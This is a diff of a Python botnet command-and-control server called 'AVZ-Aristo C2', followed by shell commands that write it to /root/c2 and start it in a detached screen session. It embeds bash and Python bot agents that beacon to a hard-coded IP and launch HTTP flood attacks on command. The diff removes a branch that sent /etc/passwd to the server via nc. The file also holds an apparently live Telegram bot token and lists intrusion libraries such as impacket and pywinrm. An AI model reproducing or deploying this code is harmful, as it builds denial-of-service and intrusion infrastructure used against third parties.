@@ -1,5 +1,6 @@
+cat > /root/c2/botnet/c2.py << 'EOF'
 #!/usr/bin/env python3
-# AVZ-Aristo C2 v25.14.4 – исправленная автоустановка зависимостей
+# AVZ-Aristo C2 v25.15.1 – исправленная автоустановка
 import asyncio, json, os, time, subprocess, sys, requests
 from datetime import datetime
 from aiohttp import web
@@ -13,7 +14,6 @@ TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
 TELEGRAM_CHAT_ID = "2119367196"
 
 AGENT_BASH = """#!/bin/bash
-# AVZ-Aristo Bash Agent v25.10
 C2_HOST="80.249.146.202"
 C2_PORT=80
 while true; do
@@ -40,20 +40,11 @@ done
 """
 
 AGENT_PYTHON = """#!/usr/bin/env python3
-# AVZ-Aristo Python Agent v25.10
 import socket, json, time, os, platform, subprocess, threading
-
 C2_HOST = "80.249.146.202"
 C2_PORT = 80
-
 def get_info():
-    return {
-        "hostname": platform.node(),
-        "os": f"{platform.system()} {platform.release()}",
-        "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
-        "ram": "unknown"
-    }
-
+    return {"hostname": platform.node(), "os": f"{platform.system()} {platform.release()}", "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown", "ram": "unknown"}
 def register():
     try:
         s = socket.socket(); s.settimeout(5)
@@ -61,7 +52,6 @@ def register():
         s.sendall(json.dumps(get_info()).encode())
         s.close()
     except: pass
-
 def get_commands():
     try:
         s = socket.socket(); s.settimeout(5)
@@ -73,7 +63,6 @@ def get_commands():
             return json.loads(data)
     except: pass
     return []
-
 def main():
     register()
     while True:
@@ -81,7 +70,6 @@ def main():
         for cmd in cmds:
             if cmd.get("type") == "attack":
                 target = cmd.get("target")
-                method = cmd.get("method", "GET")
                 threads = int(cmd.get("threads", 10))
                 def flood():
                     import requests
@@ -90,12 +78,7 @@ def main():
                             requests.get(target, timeout=2)
                         except: pass
                 threading.Thread(target=flood, daemon=True).start()
-            elif cmd.get("type") == "grab":
-                os.system("cat /etc/passwd | nc {} {}".format(C2_HOST, C2_PORT))
-            elif cmd.get("type") == "stop":
-                os.system("pkill wget; pkill python3")
         time.sleep(5)
-
 if __name__ == "__main__":
     main()
 """
@@ -126,10 +109,9 @@ def telegram_notify(msg):
         except: pass
 
 def ensure_dependencies():
-    # Список библиотек с безопасной установкой
     deps = [
         'redis', 'docker', 'asyncssh', 'paramiko', 'aiohttp', 'requests',
-        'mysql-connector-python', 'pymssql', 'psycopg2-binary',  # заменили psycopg2 на binary
+        'mysql-connector-python', 'pymssql', 'psycopg2-binary',
         'impacket', 'pywinrm', 'vncdotool'
     ]
     for lib in deps:
@@ -206,7 +188,6 @@ async def handle_tcp(reader, writer):
             bots[ip]["status"] = "online"
             save_bots()
     else:
-        # Регистрация нового бота
         info = {}
         try:
             data = json.loads(msg)
@@ -308,3 +289,8 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+EOF
+
+pkill -9 -f botnet/c2.py
+screen -dmS c2 python3 /root/c2/botnet/c2.py
+sleep 2 && ss -tlnp | grep 80
